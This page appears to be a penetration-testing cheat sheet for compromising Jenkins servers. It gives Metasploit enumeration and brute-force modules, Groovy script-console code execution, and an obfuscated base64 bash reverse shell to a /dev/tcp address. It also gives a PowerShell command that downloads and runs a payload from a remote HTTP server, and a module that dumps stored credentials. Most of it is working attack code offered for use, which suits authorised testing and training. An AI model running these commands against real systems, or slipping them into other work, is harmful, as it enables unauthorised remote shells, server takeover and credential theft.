# Jenkins

## Enumeration

In order to search for interesting Jenkins pages without authentication like \(_/people_ or _/asynchPeople_, this lists the current users\) you can use:

```text
msf> use auxiliary/scanner/http/jenkins_enum
```

Check if you can execute commands without needing authentication:

```text
msf> use auxiliary/scanner/http/jenkins_command
```

Without credentials you can look inside _**/asynchPeople/**_ path or  _**/securityRealm/user/admin/search/index?q=**_ for **usernames**.

You may e ale to get the Jenkins version from the path _**/oops**_ or _**/error**_

![](../../.gitbook/assets/image%20%28422%29.png)

## Bruteforce

**Jekins** does **not** implement any **password policy** or username **brute-force mitigation**. Then, you **should** always try to **brute-force** users because probably **weak passwords** are being used \(even **usernames as passwords** or **reverse** usernames as passwords\).

```text
msf> use auxiliary/scanner/http/jenkins_login
```

## Exploiting Vulnerabilities

{% embed url="https://github.com/gquere/pwn\_jenkins" %}

## Code Execution

There are 3 ways to get **code execution** with Jenkins.

### **Create a new project**

This method is very noisy because you have to create a hole new project \(obviously this will only work if you user is allowed to create a new project\).

1. Create a new project \(Freestyle project\)
2. Inside **Build** section set **Execute shell** and paste a powershell Empire launcher or a meterpreter powershell \(can be obtained using _unicorn_\). Start the payload with _PowerShell.exe_ instead using _powershell._
3. Click **Build now**

\*\*\*\*

Go to the projects and check **if you can configure any** of them \(look for the "Configure button"\):

![](../../.gitbook/assets/image%20%28228%29.png)

Or **try to access to the path** _**/configure**_ in each project \(example: /_me/my-views/view/all/job/Project0/configure_\).

If you are allowed to configure the project you can **make it execute commands when a build is successful**:

![](../../.gitbook/assets/image%20%2887%29.png)

Click on **Save** and **build** the project and your **command will be executed**.  
If you are not executing a reverse shell but a simple command you can **see the output of the command inside the output of the build**.

### **Execute Groovy script**

Best way. Less noisy.

1. Go to _path\_jenkins/script_
2. Inside the text box introduce the script

```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```

You could execute a command using: `cmd.exe /c dir`

In **linux** you can do:  **`"ls /".execute().text`**

If you need to use _quotes_ and _single quotes_ inside the text. You can use _"""PAYLOAD"""_ \(triple double quotes\) to execute the payload.

**Another useful groovy script** is \(replace \[INSERT COMMAND\]\):

```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Reverse shell in linux

```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Reverse shell in windows

You can prepare a HTTP server with a PS reverse shell and use Jeking to download and execute it:

```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```

### MSF exploit

You can use MSF to get a reverse shell:

```text
msf> use exploit/multi/http/jenkins_script_console
```

## POST

Dump Jenkins credentials using:

```text
msf> post/multi/gather/jenkins_gather
```

## References

{% embed url="https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/" %}

{% embed url="https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password" %}

